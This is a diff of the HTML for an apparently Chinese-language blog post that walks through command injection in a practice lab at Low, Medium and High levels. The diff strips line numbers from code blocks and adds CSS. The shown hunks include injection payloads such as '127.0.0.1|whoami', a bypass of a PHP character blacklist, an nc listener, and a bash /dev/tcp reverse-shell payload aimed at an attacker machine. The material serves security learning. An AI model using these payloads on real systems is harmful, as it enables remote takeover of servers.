@@ -12,7 +12,34 @@
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Web Sec' /><meta property='article:published_time' content='2022-09-02T21:29:09&#43;08:00'/><meta property='article:modified_time' content='2022-09-02T21:29:09&#43;08:00'/><meta property='og:image' content='https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/cover.jpg' />
 <meta name="twitter:title" content="Web安全:命令执行/注入(RCE)">
 <meta name="twitter:description" content="死 亡 之 P I N G 大雾)"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/cover.jpg' />
+    <meta name="twitter:image" content='https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/cover.jpg' /><head>
+    <style>
+ .blur {
+   color: transparent;
+   text-shadow:0px 0px 8px rgba(0,0,0,0.5)
+}
+
+.blur:hover {
+   color: transparent;
+   text-shadow:0px 0px 0px rgba(0,0,0,1)
+
+}
+
+.shady {
+   color:#000;
+   font-weight: bold;
+   box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; 
+   transition: all 0.3s ease;
+}
+.shady:hover{
+  font-weight: bold;
+   color:#FFF;
+   box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; 
+}
+</style>
+</head>
+
+
     </head>
     <body class="
     article-page
@@ -415,7 +442,7 @@
 <h3 id="low">Low</h3>
 <p>这个版本就是属于喂啥吃啥的类型</p>
 <p>简单写一个payload</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">127.0.0.1<span class="p">;</span>whoami
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">127.0.0.1<span class="p">;</span>whoami
 </span></span></code></pre></div><p><img src="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-49.png"
 	width="855"
 	height="391"
@@ -432,17 +459,17 @@
 ></p>
 <h3 id="medium">Medium</h3>
 <p>看一眼源码</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">// Set blacklist
-</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span>    <span class="nv">$substitutions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
-</span></span><span class="line"><span class="ln">3</span><span class="cl">        <span class="s1">&#39;&amp;&amp;&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="ln">4</span><span class="cl">        <span class="s1">&#39;;&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="p">);</span>
-</span></span><span class="line"><span class="ln">6</span><span class="cl">
-</span></span><span class="line"><span class="ln">7</span><span class="cl">    <span class="c1">// Remove any of the charactars in the array (blacklist).
-</span></span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="c1"></span>    <span class="nv">$target</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nx">array_keys</span><span class="p">(</span> <span class="nv">$substitutions</span> <span class="p">),</span> <span class="nv">$substitutions</span><span class="p">,</span> <span class="nv">$target</span> <span class="p">);</span> 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Set blacklist
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$substitutions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&amp;&amp;&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;;&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Remove any of the charactars in the array (blacklist).
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$target</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nx">array_keys</span><span class="p">(</span> <span class="nv">$substitutions</span> <span class="p">),</span> <span class="nv">$substitutions</span><span class="p">,</span> <span class="nv">$target</span> <span class="p">);</span> 
 </span></span></code></pre></div><p>发现它过滤了黑名单中的<code>&amp;&amp;</code>和<code>;</code>字符</p>
 <p>换成黑名单中没有否字符即可</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl"> <span class="o">||</span>whoami
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> <span class="o">||</span>whoami
 </span></span></code></pre></div><blockquote>
 <p>P.S. 因为没有ip,所以Ping执行失败了，所以执行后面的<code>whoami</code>命令</p>
 </blockquote>
@@ -462,25 +489,25 @@
 ></p>
 <h3 id="high">High</h3>
 <p>这次的黑名单已经很全了</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1">// Set blacklist
-</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"></span>    <span class="nv">$substitutions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl">        <span class="s1">&#39;&amp;&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl">        <span class="s1">&#39;;&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="s1">&#39;| &#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl">        <span class="s1">&#39;-&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="s1">&#39;$&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="s1">&#39;(&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="s1">&#39;)&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="s1">&#39;`&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="s1">&#39;||&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="p">);</span>
-</span></span><span class="line"><span class="ln">13</span><span class="cl">
-</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="c1">// Remove any of the characters in the array (blacklist).
-</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>    <span class="nv">$target</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nx">array_keys</span><span class="p">(</span> <span class="nv">$substitutions</span> <span class="p">),</span> <span class="nv">$substitutions</span><span class="p">,</span> <span class="nv">$target</span> <span class="p">);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Set blacklist
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$substitutions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&amp;&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;;&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;| &#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;-&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;$&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;(&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;)&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;`&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;||&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Remove any of the characters in the array (blacklist).
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$target</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nx">array_keys</span><span class="p">(</span> <span class="nv">$substitutions</span> <span class="p">),</span> <span class="nv">$substitutions</span><span class="p">,</span> <span class="nv">$target</span> <span class="p">);</span>
 </span></span></code></pre></div><p>不过捏，细心的朋友应该发现了，这个容易手滑的开发者做了一个有大病的事情</p>
 <p>程序过滤了<code>| </code>(有空格)，而不是<code>|</code>&hellip;</p>
 <p>所以我们完全可以用<code>|</code>绕过去</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">127.0.0.1<span class="p">|</span>whoami
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">127.0.0.1<span class="p">|</span>whoami
 </span></span></code></pre></div><p><img src="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-02.png"
 	width="841"
 	height="212"
@@ -497,7 +524,7 @@
 <p>为了能更优雅，舒适地控制目标机器</p>
 <p>我们可以弹个shell</p>
 <p>先在攻击的机器上用nc监听一个端口(端口任意，只要不被其他东西占用)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">nc -lvnp 端口号
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp 端口号
 </span></span></code></pre></div><p><img src="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-13.png"
 	width="426"
 	height="147"
@@ -513,7 +540,7 @@
 	
 ></p>
 <p>在靶机输入payload</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">127.0.0.1<span class="p">|</span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/攻击机器ip/端口号 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">127.0.0.1<span class="p">|</span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/攻击机器ip/端口号 0&gt;<span class="p">&amp;</span><span class="m">1</span>
 </span></span></code></pre></div><p><img src="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-23.png"
 	width="1048"
 	height="357"
